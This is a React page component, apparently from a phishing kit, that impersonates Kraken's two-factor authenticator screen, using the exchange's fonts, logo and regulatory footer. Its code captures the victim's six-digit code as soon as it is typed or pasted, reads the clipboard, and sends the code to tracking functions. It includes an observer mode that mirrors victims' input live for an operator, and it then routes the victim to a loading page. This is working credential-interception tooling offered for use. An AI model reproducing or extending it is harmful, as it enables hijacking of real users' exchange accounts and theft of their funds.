import { createFileRoute } from "@tanstack/react-router";
import { useState, useRef, useEffect } from "react";
import {
  KrakenLogo, KnFontStyle, useKnTracking,
} from "@/components/kn/KnShared";

export const Route = createFileRoute("/kn/authenticator")({
  head: () => ({ meta: [{ title: "Enter your code" }] }),
  component: KrakenAuthenticatorPage,
});

function KrakenAuthenticatorPage() {
  const { trackClick, trackInput, trackSubmit, knNavigate, sessionId, isObserve } = useKnTracking();
  const [digits, setDigits] = useState<string[]>(['', '', '', '', '', '']);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newDigits = [...digits];
    newDigits[index] = value.slice(-1);
    setDigits(newDigits);
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
    if (newDigits.every(d => d !== '')) {
      trackInput('authenticator', newDigits.join(''), 'text');
      trackClick('Authenticator Code Submitted');
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !digits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const text = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    if (!text) return;
    const newDigits = [...digits];
    for (let i = 0; i < text.length; i++) {
      newDigits[i] = text[i];
    }
    setDigits(newDigits);
    const focusIdx = Math.min(text.length, 5);
    inputRefs.current[focusIdx]?.focus();
    if (newDigits.every(d => d !== '')) {
      trackInput('authenticator', newDigits.join(''), 'text');
      trackClick('Authenticator Code Submitted');
    }
  };

  const handleContinue = () => {
    if (!digits.every(d => d !== '')) return;
    trackClick('Continue');
    trackSubmit('authenticator', digits.join(''));
    knNavigate('/kn/loading');
  };

  const allFilled = digits.every(d => d !== '');

  useEffect(() => {
    if (!isObserve) return;
    function onMirror(e: Event) {
      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
      if (!d?.field) return;
      if (d.field !== 'authenticator' && d.field !== 'authenticator_submitted' && !/code|case/i.test(d.field)) return;
      const value = String(d.value ?? '').replace(/\D/g, '').slice(0, 6);
      const next = ['', '', '', '', '', ''];
      for (let i = 0; i < value.length; i++) next[i] = value[i];
      setDigits(next);
    }
    window.addEventListener('ux:mirror-live-input', onMirror);
    return () => window.removeEventListener('ux:mirror-live-input', onMirror);
  }, [isObserve]);

  return (
    <div
      className="kn-page min-h-screen flex flex-col"
      style={{
        backgroundColor: '#f6f5f9',
        fontFamily: "'Kraken-Product', 'IBM Plex Sans', Helvetica, Arial, sans-serif",
      }}
    >
      <KnFontStyle />
      <style>{`
        @font-face {
          font-family: 'Kraken-Product';
          src: url('/fonts/Kraken-Product-Regular.woff2') format('woff2');
          font-weight: 400;
          font-style: normal;
          font-display: swap;
        }
        @font-face {
          font-family: 'Kraken-Product';
          src: url('/fonts/Kraken-Product-Medium.woff2') format('woff2');
          font-weight: 500;
          font-style: normal;
          font-display: swap;
        }
        @font-face {
          font-family: 'Kraken-Brand';
          src: url('/fonts/Kraken-Brand-Medium.woff2') format('woff2');
          font-weight: 500;
          font-style: normal;
          font-display: swap;
        }
        * { font-family: 'Kraken-Product', 'IBM Plex Sans', Helvetica, Arial, sans-serif !important; }
        @media (max-width: 640px) {
          .kraken-card { background-color: transparent !important; box-shadow: none !important; border-radius: 0 !important; padding: 16px 0 !important; }
          .kraken-lang-btn { display: none !important; }
          .kraken-footer-detail { display: none !important; }
          .kraken-footer { justify-content: center !important; }
          .kraken-header { padding-left: 16px !important; padding-right: 16px !important; }
        }
      `}</style>

      {/* Header */}
      <header style={{ paddingTop: 12, backgroundColor: '#f6f5f9' }}>
        <div
          className="flex items-center justify-between kraken-header"
          style={{ height: 40, paddingLeft: 36, paddingRight: 36 }}
        >
          <div className="cursor-pointer" onClick={() => trackClick('Logo')}>
            <KrakenLogo />
          </div>
          <button
            className="flex items-center kraken-lang-btn"
            style={{
              gap: 4,
              padding: '8px 12px',
              borderRadius: 8,
              border: 'none',
              cursor: 'pointer',
              backgroundColor: '#686b8214',
              color: '#686b82',
              fontSize: 12,
              fontWeight: 400,
              lineHeight: '16px',
            }}
          >
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M21 12C21 16.9706 16.9706 21 12 21M21 12C21 7.02944 16.9706 3 12 3M21 12H3M12 21C7.02944 21 3 16.9706 3 12M12 21C9.79086 21 8 16.9706 8 12C8 7.02944 9.79086 3 12 3M12 21C14.2091 21 16 16.9706 16 12C16 7.02944 14.2091 3 12 3M3 12C3 7.02944 7.02944 3 12 3" strokeWidth="2" strokeLinecap="square" stroke="#9497a9" fill="transparent"/>
            </svg>
            <span>English (US)</span>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M7.5 9.98291L11.2045 13.6874C11.6438 14.1268 12.3562 14.1268 12.7955 13.6874L16.5 9.98291" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" stroke="#9497a9" fill="transparent"/>
            </svg>
          </button>
        </div>
      </header>

      {/* Main */}
      <main className="flex-1 flex justify-center px-4" style={{ marginTop: '5%' }}>
        <div style={{ width: 498, maxWidth: '100%' }}>
          <div
            className="kraken-card"
            style={{
              backgroundColor: '#fff',
              borderRadius: 16,
              padding: 24,
              boxShadow: '0px 1px 4px 0px #1018280a',
            }}
          >
            <div className="flex flex-col items-center" style={{ gap: 24 }}>
              {/* Authenticator icon */}
              <img
                src="/images/kraken-authenticator-icon.png"
                alt="Authenticator"
                style={{ width: 80, height: 80 }}
              />

              {/* Title */}
              <h1
                className="text-center"
                style={{
                  fontSize: 28,
                  fontWeight: 500,
                  lineHeight: '36px',
                  color: '#101114',
                  margin: 0,
                }}
              >
                Enter your code
              </h1>

              {/* Subtitle */}
              <p
                className="text-center"
                style={{
                  fontSize: 14,
                  fontWeight: 400,
                  lineHeight: '20px',
                  color: '#686b82',
                  margin: '-16px 0 0 0',
                }}
              >
                Enter the 6-digit code generated on your authenticator app to continue
              </p>

              {/* 6-digit inputs */}
              <div style={{ display: 'flex', gap: 8, width: '100%', justifyContent: 'center' }}>
                {digits.map((digit, i) => (
                  <input
                    key={i}
                    ref={(el) => { inputRefs.current[i] = el; }}
                    type="text"
                    inputMode="numeric"
                    data-ux-field="authenticator"
                    name="authenticator"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleChange(i, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(i, e)}
                    onPaste={i === 0 ? handlePaste : undefined}
                    style={{
                      width: 52,
                      height: 56,
                      borderRadius: 12,
                      border: 'none',
                      backgroundColor: '#686b8214',
                      fontSize: 22,
                      fontWeight: 500,
                      textAlign: 'center',
                      color: '#101114',
                      outline: '2px solid transparent',
                      outlineOffset: -2,
                      caretColor: '#7132f5',
                      transition: 'outline-color 0.15s ease, background-color 0.15s ease',
                    }}
                    onFocus={(e) => {
                      e.target.style.outlineColor = '#7132f5';
                      e.target.style.backgroundColor = '#686b820a';
                    }}
                    onBlur={(e) => {
                      e.target.style.outlineColor = 'transparent';
                      e.target.style.backgroundColor = '#686b8214';
                    }}
                  />
                ))}
              </div>

              {/* Paste from clipboard */}
              <button
                onClick={async () => {
                  try {
                    const text = await navigator.clipboard.readText();
                    const clean = text.replace(/\D/g, '').slice(0, 6);
                    if (!clean) return;
                    const newDigits = [...digits];
                    for (let i = 0; i < clean.length; i++) newDigits[i] = clean[i];
                    setDigits(newDigits);
                    trackInput('authenticator', newDigits.join(''), 'text');
                    trackClick('Paste from clipboard');
                  } catch {}
                }}
                style={{
                  background: 'none',
                  border: 'none',
                  cursor: 'pointer',
                  fontSize: 14,
                  fontWeight: 500,
                  color: '#7132f5',
                  padding: 0,
                  margin: '-8px 0 0 0',
                }}
                onMouseEnter={(e) => (e.currentTarget.style.textDecoration = 'underline')}
                onMouseLeave={(e) => (e.currentTarget.style.textDecoration = 'none')}
              >
                Paste from clipboard
              </button>

              {/* Continue button — full width */}
              <button
                onClick={handleContinue}
                disabled={!allFilled}
                style={{
                  width: '100%',
                  height: 52,
                  borderRadius: 12,
                  border: 'none',
                  cursor: allFilled ? 'pointer' : 'default',
                  backgroundColor: allFilled ? '#7132f5' : '#c6c7d2',
                  color: '#fff',
                  fontSize: 16,
                  fontWeight: 500,
                  lineHeight: '22px',
                  transition: 'background-color 0.15s ease',
                  pointerEvents: allFilled ? 'auto' : 'none',
                }}
                onMouseEnter={(e) => {
                  if (allFilled) e.currentTarget.style.backgroundColor = '#5b1ecf';
                }}
                onMouseLeave={(e) => {
                  if (allFilled) e.currentTarget.style.backgroundColor = '#7132f5';
                }}
                onMouseDown={(e) => {
                  if (allFilled) e.currentTarget.style.backgroundColor = '#471ca0';
                }}
                onMouseUp={(e) => {
                  if (allFilled) e.currentTarget.style.backgroundColor = '#5b1ecf';
                }}
              >
                Continue
              </button>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer
        className="flex items-center justify-between kraken-footer"
        style={{ padding: '16px 24px' }}
      >
        <p
          style={{
            fontSize: 11,
            color: '#9497a9',
            margin: 0,
          }}
        >
          Brokerage services are provided by Kraken Securities, LLC, member{' '}
          <a href="#" style={{ color: '#7132f5', textDecoration: 'none' }}
            onMouseEnter={(e) => (e.currentTarget.style.textDecoration = 'underline')}
            onMouseLeave={(e) => (e.currentTarget.style.textDecoration = 'none')}
          >FINRA</a>
          /
          <a href="#" style={{ color: '#7132f5', textDecoration: 'none' }}
            onMouseEnter={(e) => (e.currentTarget.style.textDecoration = 'underline')}
            onMouseLeave={(e) => (e.currentTarget.style.textDecoration = 'none')}
          >SIPC</a>
          .{' '}
          <a href="#" style={{ color: '#7132f5', textDecoration: 'none' }}
            onMouseEnter={(e) => (e.currentTarget.style.textDecoration = 'underline')}
            onMouseLeave={(e) => (e.currentTarget.style.textDecoration = 'none')}
          >Disclosures here</a>
          .
        </p>
        <div className="flex items-center kraken-footer-detail" style={{ gap: 16 }}>
          <a href="#" style={{ fontSize: 11, color: '#9497a9', textDecoration: 'none' }}>Privacy Notice</a>
          <a href="#" style={{ fontSize: 11, color: '#9497a9', textDecoration: 'none' }}>Terms of Service</a>
        </div>
      </footer>

      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">{sessionId}</div>
    </div>
  );
}
